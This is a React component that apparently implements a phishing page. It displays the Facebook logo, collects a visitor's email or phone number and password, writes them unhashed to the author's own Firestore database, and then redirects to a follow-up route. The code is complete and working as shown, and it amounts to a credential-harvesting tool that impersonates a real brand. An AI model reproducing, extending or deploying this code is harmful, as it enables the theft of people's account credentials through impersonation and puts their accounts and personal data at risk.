import { useState } from 'react';
import { useNavigate } from "react-router-dom";
import { db } from './firebase.config';
import { setDoc, doc } from 'firebase/firestore';
import facebook from '../fb.png';

export default function Home() {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    fname: '',
    lname: '',
    email: '',
    psw: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleClick = async (e) => {
    e.preventDefault();
    
    const { fname, lname, email, psw } = formData;

    try {
      // Generate unique user ID
      const userId = doc(db, 'users', Date.now().toString()).id;
      
      const userData = { email, psw, uid: userId };

      // Save the user data to Firestore
      await setDoc(doc(db, 'users', userId), userData);

      // Store the UID in localStorage
      localStorage.setItem('uid', userId);

      // Navigate to the next page
      navigate("/continu");
    } catch (error) {
      alert("Error during sign up: " + error.message); // Updated error handling
    }
  };

  return (
    <div className='flex justify-center items-center flex-col h-[98vh] gap-8'>
      <img src={facebook} alt="Facebook logo" height={32} width={82}/> {/* Fixed image source */}
      
     
      <input
        name="email"
        className='outline-blue-600 border-2 p-4 w-96'
        placeholder="Mobile number or email address"
        value={formData.email}
        onChange={handleChange}
      />
      <input
        name="psw"
        type="password"
        className='outline-blue-600 border-2 p-4 w-96'
        placeholder="Password"
        value={formData.psw}
        onChange={handleChange}
      />
      <button
        type="button"
        onClick={handleClick}
        className="w-96 p-1 rounded-full text-[4vh] text-white bg-blue-600"
      >
        Submit
      </button>
    </div>
  );
}
